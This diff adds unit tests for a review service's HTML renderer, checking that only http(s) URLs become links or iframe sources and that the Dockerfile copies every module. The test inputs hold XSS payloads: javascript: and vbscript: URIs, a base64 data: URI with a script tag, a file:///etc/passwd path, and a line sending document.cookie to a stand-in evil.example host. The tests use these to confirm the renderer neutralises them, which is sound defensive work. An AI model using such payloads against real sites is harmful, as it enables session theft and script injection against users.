@@ -543,3 +543,65 @@ test('the quality floor the stylesheet promises is actually in it', () => {
   assert.match(source, /:focus-visible/);
   assert.match(source, /@media \(min-width: 56rem\)/, 'the two-column layout must be the wide case, not the default');
 });
+
+// ---------------------------------------------------------------------------
+// URL handling
+// ---------------------------------------------------------------------------
+
+// escapeHtml stops a URL breaking out of its attribute. It does not stop
+// `javascript:` inside one, which runs on click in an href and on load in an
+// iframe src. Every URL on these screens comes from outside: Drive URLs from
+// WF8, post URLs straight out of a provider's API response.
+test('only http(s) survives as a URL; anything else is not a link', () => {
+  const { safeHref } = require('../hosts/review/render');
+  assert.equal(safeHref('https://example.com/x'), 'https://example.com/x');
+  assert.equal(safeHref('http://example.com/x'), 'http://example.com/x');
+  assert.equal(safeHref('  https://example.com/x  '), 'https://example.com/x');
+  for (const hostile of [
+    'javascript:alert(1)', 'JaVaScRiPt:alert(1)', ' javascript:alert(1)',
+    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
+    'vbscript:msgbox(1)', 'file:///etc/passwd', '//evil.example/x', '', null, undefined,
+  ]) {
+    assert.equal(safeHref(hostile), '', `${hostile} must not become a URL`);
+  }
+});
+
+test('a hostile Drive URL renders no iframe rather than an executing one', () => {
+  const html = clipItem({ created_clip_id: 'C1', google_drive_url: 'javascript:alert(1)' });
+  assert.doesNotMatch(html, /<iframe/);
+  assert.doesNotMatch(html, /javascript:/);
+  assert.match(html, /No render yet/);
+});
+
+// post_url is written from a provider's API response, so it is the least
+// trusted string on any of these screens.
+test('a hostile post URL from a provider renders as text, not a link', () => {
+  const html = publishedBoard({
+    jobs: [{ title: 'A Clip', platform: 'TIKTOK', publish_status: 'PUBLISHED',
+      post_url: 'javascript:fetch("//evil.example?c="+document.cookie)' }],
+  }, NOW);
+  assert.doesNotMatch(html, /javascript:/);
+  assert.doesNotMatch(html, /<a href/);
+  assert.match(html, />published</);
+});
+
+test('a hostile source URL renders no link', () => {
+  for (const hostile of ['javascript:alert(1)', 'data:text/html,<script>alert(1)</script>']) {
+    assert.equal(sourceLink(hostile, 10), '');
+  }
+});
+
+// The Dockerfile copies files by name, so adding a module to this service and
+// not to the COPY line ships an image that crash-loops on MODULE_NOT_FOUND.
+// Nothing else catches it: every test here passes against the source tree.
+test('every source file this service has is copied into its image', () => {
+  const dir = path.join(__dirname, '..', 'hosts', 'review');
+  const dockerfile = fs.readFileSync(path.join(dir, 'Dockerfile'), 'utf8');
+  const copied = dockerfile
+    .split('\n')
+    .filter((line) => line.startsWith('COPY '))
+    .join(' ');
+  for (const file of fs.readdirSync(dir).filter((name) => name.endsWith('.js'))) {
+    assert.ok(copied.includes(file), `${file} is not COPYed into the image`);
+  }
+});
